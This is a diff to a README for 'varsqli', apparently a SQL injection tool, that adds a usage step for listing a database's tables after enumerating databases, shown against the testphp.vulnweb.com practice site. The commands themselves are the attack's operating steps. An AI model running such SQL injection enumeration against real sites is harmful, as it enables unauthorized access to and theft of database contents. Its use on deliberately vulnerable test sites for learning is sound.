@@ -52,3 +52,5 @@ options:
  - `$ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs`
 <img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-16-10-49-93.jpg">
 <img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-16-14-14-40.jpg">
+- After we have extracted and obtained the name of the database, you use options `--tables -D <database name>` , this is the command, extract all databases  In the tables section, the command:
+- `$ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --tables -D acuart`
